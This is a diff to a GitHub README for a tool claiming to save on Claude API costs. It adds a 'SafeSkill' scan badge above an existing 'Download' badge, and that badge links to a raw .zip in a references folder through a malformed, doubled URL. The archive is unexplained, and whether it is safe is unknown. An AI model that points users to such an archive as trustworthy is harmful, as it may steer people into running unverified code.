@@ -1,5 +1,7 @@
 # 🥋 claude-api-cost-optimization - Save Big on Claude API Costs
 
+[![SafeSkill 88/100](https://img.shields.io/badge/SafeSkill-88%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/louishin-claude-api-cost-optimization)
+
 [![Download](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip%https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip)](https://github.com/Louishin/claude-api-cost-optimization/raw/refs/heads/main/references/cost-optimization-api-claude-2.7.zip)
 
 ## 👋 Introduction
